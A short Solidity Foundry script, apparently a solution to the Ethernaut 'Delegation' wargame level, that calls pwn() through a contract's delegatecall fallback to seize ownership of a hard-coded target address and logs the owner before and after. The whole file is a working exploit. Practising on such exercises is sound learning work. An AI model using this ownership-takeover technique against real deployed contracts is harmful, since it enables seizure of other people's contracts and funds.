// SPDX_License-Identifer: MIT
pragma solidity ^0.8.0;

import '../src/6_Delegation.sol';
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackOnDelegation is Script{
    Delegation public delegation = Delegation(0xb9e2B225955E072FD60220222B4ef8588A3DCDc2);

    function run() external {

        // vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vm.startBroadcast();
        console.log("Owner Before: ", delegation.owner());
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner after: ", delegation.owner());
        // console.log("Msg.sender: ", msg.sender);
        console.log("Address of this contract: ", address(this));

        vm.stopBroadcast();

    }

}
